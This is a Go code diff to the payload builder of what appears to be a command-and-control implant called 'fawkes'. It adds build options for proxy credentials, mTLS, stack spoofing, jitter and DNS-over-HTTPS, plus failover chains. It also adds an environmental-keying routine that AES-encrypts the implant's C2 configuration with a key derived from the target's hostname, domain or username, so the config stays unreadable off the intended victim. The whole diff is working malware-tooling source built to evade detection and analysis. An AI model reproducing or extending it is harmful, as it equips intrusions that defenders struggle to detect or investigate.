@@ -1,7 +1,10 @@
 package agentfunctions
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	cryptorand "crypto/rand"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -141,17 +144,38 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 	if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
 		ldflags += fmt.Sprintf(" -X '%s.proxyURL=%s'", fawkesMainPackage, proxyURL)
 	}
+	if proxyUser, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_user"); err == nil && proxyUser != "" {
+		ldflags += fmt.Sprintf(" -X '%s.proxyUser=%s'", fawkesMainPackage, proxyUser)
+	}
+	if proxyPass, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_pass"); err == nil && proxyPass != "" {
+		ldflags += fmt.Sprintf(" -X '%s.proxyPass=%s'", fawkesMainPackage, proxyPass)
+	}
+	if proxyDomain, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_domain"); err == nil && proxyDomain != "" {
+		ldflags += fmt.Sprintf(" -X '%s.proxyDomain=%s'", fawkesMainPackage, proxyDomain)
+	}
 	if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
 		ldflags += fmt.Sprintf(" -X '%s.fallbackHosts=%s'", fawkesMainPackage, fbHosts)
 	}
 	if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
 		ldflags += fmt.Sprintf(" -X '%s.contentTypes=%s'", fawkesMainPackage, ct)
 	}
+	if tp, err := payloadBuildMsg.BuildParameters.GetStringArg("traffic_profile"); err == nil && tp != "" && tp != "generic" {
+		ldflags += fmt.Sprintf(" -X '%s.trafficProfile=%s'", fawkesMainPackage, tp)
+	}
 	if tlsVerify, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_verify"); err == nil && tlsVerify != "" {
 		ldflags += fmt.Sprintf(" -X '%s.tlsVerify=%s'", fawkesMainPackage, tlsVerify)
 	}
 	if tlsFP, err := payloadBuildMsg.BuildParameters.GetStringArg("tls_fingerprint"); err == nil && tlsFP != "" && tlsFP != "go" {
 		ldflags += fmt.Sprintf(" -X '%s.tlsFingerprint=%s'", fawkesMainPackage, tlsFP)
+	}
+	// mTLS client certificate (base64-encode PEM to survive ldflags)
+	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
+		ldflags += fmt.Sprintf(" -X '%s.mtlsCertPEM=%s'", fawkesMainPackage, encoded)
+	}
+	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
+		ldflags += fmt.Sprintf(" -X '%s.mtlsKeyPEM=%s'", fawkesMainPackage, encoded)
 	}
 
 	// TCP P2P bind address
@@ -212,6 +236,15 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 	if slpGuard, err := payloadBuildMsg.BuildParameters.GetBooleanArg("sleep_guard_pages"); err == nil && slpGuard {
 		ldflags += fmt.Sprintf(" -X '%s.sleepGuardPages=true'", fawkesMainPackage)
 	}
+	if stkSpoof, err := payloadBuildMsg.BuildParameters.GetBooleanArg("stack_spoof"); err == nil && stkSpoof {
+		ldflags += fmt.Sprintf(" -X '%s.stackSpoof=true'", fawkesMainPackage)
+	}
+	if jpStr, err := payloadBuildMsg.BuildParameters.GetStringArg("jitter_profile"); err == nil && jpStr != "" && jpStr != "uniform" {
+		ldflags += fmt.Sprintf(" -X '%s.jitterProfile=%s'", fawkesMainPackage, jpStr)
+	}
+	if dohStr, err := payloadBuildMsg.BuildParameters.GetStringArg("doh_resolver"); err == nil && dohStr != "" {
+		ldflags += fmt.Sprintf(" -X '%s.dohResolver=%s'", fawkesMainPackage, dohStr)
+	}
 
 	// Kill date: parse date string to Unix timestamp
 	if kdStr, err := payloadBuildMsg.BuildParameters.GetStringArg("kill_date"); err == nil && kdStr != "" {
@@ -246,6 +279,14 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 		ldflags += fmt.Sprintf(" -X '%s.maxRetries=%s'", fawkesMainPackage, mrStr)
 	}
 
+	// Key rotation interval (ECDH forward secrecy)
+	if krStr, err := payloadBuildMsg.BuildParameters.GetStringArg("key_rotation_interval"); err == nil && krStr != "" && krStr != "0" {
+		if _, parseErr := strconv.Atoi(krStr); parseErr != nil {
+			return "", fmt.Errorf("invalid key_rotation_interval %q — must be a number", krStr)
+		}
+		ldflags += fmt.Sprintf(" -X '%s.keyRotationInterval=%s'", fawkesMainPackage, krStr)
+	}
+
 	// Recovery interval for unhealthy domains
 	if riStr, err := payloadBuildMsg.BuildParameters.GetStringArg("recovery_interval"); err == nil && riStr != "" && riStr != "600" {
 		if _, parseErr := strconv.Atoi(riStr); parseErr != nil {
@@ -254,12 +295,38 @@ func buildConfigLdflags(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkes
 		ldflags += fmt.Sprintf(" -X '%s.recoveryInterval=%s'", fawkesMainPackage, riStr)
 	}
 
+	// Multi-protocol failover chain
+	if fcStr, err := payloadBuildMsg.BuildParameters.GetStringArg("failover_chain"); err == nil && fcStr != "" {
+		ldflags += fmt.Sprintf(" -X '%s.failoverChain=%s'", fawkesMainPackage, fcStr)
+	}
+	if ftStr, err := payloadBuildMsg.BuildParameters.GetStringArg("failover_threshold"); err == nil && ftStr != "" && ftStr != "5" {
+		if _, parseErr := strconv.Atoi(ftStr); parseErr != nil {
+			return "", fmt.Errorf("invalid failover_threshold %q — must be a number", ftStr)
+		}
+		ldflags += fmt.Sprintf(" -X '%s.failoverThreshold=%s'", fawkesMainPackage, ftStr)
+	}
+	if frStr, err := payloadBuildMsg.BuildParameters.GetStringArg("failover_recovery"); err == nil && frStr != "" && frStr != "300" {
+		if _, parseErr := strconv.Atoi(frStr); parseErr != nil {
+			return "", fmt.Errorf("invalid failover_recovery %q — must be a number", frStr)
+		}
+		ldflags += fmt.Sprintf(" -X '%s.failoverRecovery=%s'", fawkesMainPackage, frStr)
+	}
+
 	// String obfuscation: XOR-encode C2 config strings with a random key
 	if obfStrings, err := payloadBuildMsg.BuildParameters.GetBooleanArg("obfuscate_strings"); err == nil && obfStrings {
 		var obfErr error
 		ldflags, obfErr = applyStringObfuscation(payloadBuildMsg, fawkesMainPackage, ldflags)
 		if obfErr != nil {
 			return "", obfErr
+		}
+	}
+
+	// Environmental keying: AES-GCM encrypt sensitive config with host-derived key
+	if ekDerive, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_derive"); err == nil && ekDerive != "" {
+		var deriveErr error
+		ldflags, deriveErr = applyEnvKeyDerive(payloadBuildMsg, fawkesMainPackage, ldflags, ekDerive)
+		if deriveErr != nil {
+			return "", deriveErr
 		}
 	}
 
@@ -334,14 +401,35 @@ func applyStringObfuscation(payloadBuildMsg agentstructs.PayloadBuildMessage, fa
 	if proxyURL, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_url"); err == nil && proxyURL != "" {
 		obfVars = append(obfVars, obfVar{"proxyURL", proxyURL})
 	}
+	if proxyUser, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_user"); err == nil && proxyUser != "" {
+		obfVars = append(obfVars, obfVar{"proxyUser", proxyUser})
+	}
+	if proxyPass, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_pass"); err == nil && proxyPass != "" {
+		obfVars = append(obfVars, obfVar{"proxyPass", proxyPass})
+	}
+	if proxyDomain, err := payloadBuildMsg.BuildParameters.GetStringArg("proxy_domain"); err == nil && proxyDomain != "" {
+		obfVars = append(obfVars, obfVar{"proxyDomain", proxyDomain})
+	}
 	if fbHosts, err := payloadBuildMsg.BuildParameters.GetStringArg("fallback_hosts"); err == nil && fbHosts != "" {
 		obfVars = append(obfVars, obfVar{"fallbackHosts", fbHosts})
 	}
 	if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
 		obfVars = append(obfVars, obfVar{"contentTypes", ct})
 	}
+	if tp, err := payloadBuildMsg.BuildParameters.GetStringArg("traffic_profile"); err == nil && tp != "" && tp != "generic" {
+		obfVars = append(obfVars, obfVar{"trafficProfile", tp})
+	}
 	if uap, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uap != "" {
 		obfVars = append(obfVars, obfVar{"userAgentPool", strings.ReplaceAll(uap, "'", "")})
+	}
+	// mTLS cert/key (already base64 in ldflags, obfuscate the base64 string)
+	if mtlsCert, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_cert"); err == nil && mtlsCert != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsCert))
+		obfVars = append(obfVars, obfVar{"mtlsCertPEM", encoded})
+	}
+	if mtlsKey, err := payloadBuildMsg.BuildParameters.GetStringArg("mtls_key"); err == nil && mtlsKey != "" {
+		encoded := base64.StdEncoding.EncodeToString([]byte(mtlsKey))
+		obfVars = append(obfVars, obfVar{"mtlsKeyPEM", encoded})
 	}
 
 	// Replace plaintext values in ldflags with XOR-encoded versions
@@ -396,4 +484,134 @@ func xorEncodeString(plaintext string, key []byte) string {
 		result[i] = b ^ key[i%len(key)]
 	}
 	return base64.StdEncoding.EncodeToString(result)
+}
+
+// sensitiveConfigVars lists the config variable names that contain C2-critical
+// data. When env_key_derive is active, these are extracted from ldflags and
+// bundled into the encrypted blob.
+var sensitiveConfigVars = []string{
+	"payloadUUID", "callbackHost", "callbackPort", "userAgent", "userAgentPool",
+	"encryptionKey", "getURI", "postURI", "hostHeader",
+	"proxyURL", "proxyUser", "proxyPass", "proxyDomain",
+	"customHeaders", "fallbackHosts", "contentTypes", "trafficProfile",
+	"discordBotToken", "discordChannelID", "httpxConfig", "httpxDomains",
+	"mtlsCertPEM", "mtlsKeyPEM", "xorKey",
+}
+
+// applyEnvKeyDerive encrypts sensitive config values with a key derived from
+// the target host's environment. The encrypted blob replaces the individual
+// ldflags for those values, so the binary contains no recoverable C2 config
+// unless it runs on the correct host.
+func applyEnvKeyDerive(payloadBuildMsg agentstructs.PayloadBuildMessage, fawkesMainPackage, ldflags, method string) (string, error) {
+	var components []string
+
+	if strings.Contains(method, "hostname") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_hostname")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_hostname to be set with the exact target hostname", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+	if strings.Contains(method, "domain") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_domain")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_domain to be set with the exact target domain", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+	if strings.Contains(method, "username") {
+		ek, err := payloadBuildMsg.BuildParameters.GetStringArg("env_key_username")
+		if err != nil || ek == "" {
+			return "", fmt.Errorf("env_key_derive=%q requires env_key_username to be set with the exact target username", method)
+		}
+		components = append(components, strings.ToLower(strings.TrimSpace(ek)))
+	}
+
+	if len(components) == 0 {
+		return "", fmt.Errorf("env_key_derive=%q matched no components", method)
+	}
+
+	// Derive 32-byte AES key (must match agent-side deriveEnvironmentKey)
+	seed := "fawkes-env-derive:" + strings.Join(components, ":")
+	key := sha256.Sum256([]byte(seed))
+
+	// Extract current values from ldflags (may be XOR-encoded if obfuscate_strings is active)
+	configMap := make(map[string]string)
+	for _, varName := range sensitiveConfigVars {
+		val := extractLdflagValue(ldflags, fawkesMainPackage, varName)
+		if val != "" {
+			configMap[varName] = val
+		}
+	}
+
+	if len(configMap) == 0 {
+		return "", fmt.Errorf("env_key_derive: no sensitive config values found in ldflags")
+	}
+
+	jsonBytes, err := json.Marshal(configMap)
+	if err != nil {
+		return "", fmt.Errorf("env_key_derive: failed to marshal config: %w", err)
+	}
+
+	encrypted, err := envDeriveEncrypt(key[:], jsonBytes)
+	if err != nil {
+		return "", fmt.Errorf("env_key_derive: encryption failed: %w", err)
+	}
+	blob := base64.StdEncoding.EncodeToString(encrypted)
+
+	// Remove individual sensitive variable ldflags (they're now in the blob)
+	for _, varName := range sensitiveConfigVars {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, varName)
+	}
+
+	// Remove env_key_* ldflags for derived components (derive replaces match check)
+	if strings.Contains(method, "hostname") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyHostname")
+	}
+	if strings.Contains(method, "domain") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyDomain")
+	}
+	if strings.Contains(method, "username") {
+		ldflags = removeLdflag(ldflags, fawkesMainPackage, "envKeyUsername")
+	}
+
+	ldflags += fmt.Sprintf(" -X '%s.envKeyDerive=%s'", fawkesMainPackage, method)
+	ldflags += fmt.Sprintf(" -X '%s.envDerivedBlob=%s'", fawkesMainPackage, blob)
+
+	return ldflags, nil
+}
+
+// envDeriveEncrypt performs AES-256-GCM encryption with a random 12-byte nonce prepended.
+func envDeriveEncrypt(key, plaintext []byte) ([]byte, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonce := make([]byte, gcm.NonceSize())
+	if _, err := cryptorand.Read(nonce); err != nil {
+		return nil, err
+	}
+	return gcm.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+// removeLdflag removes a -X 'pkg.varName=...' entry from the ldflags string.
+func removeLdflag(ldflags, pkg, varName string) string {
+	prefix := fmt.Sprintf("-X '%s.%s=", pkg, varName)
+	idx := strings.Index(ldflags, prefix)
+	if idx < 0 {
+		return ldflags
+	}
+	end := strings.Index(ldflags[idx+len(prefix):], "'")
+	if end < 0 {
+		return ldflags
+	}
+	flagEnd := idx + len(prefix) + end + 1
+	// Remove the flag and any leading/trailing space
+	result := ldflags[:idx] + ldflags[flagEnd:]
+	result = strings.ReplaceAll(result, "  ", " ")
+	return strings.TrimSpace(result)
 }
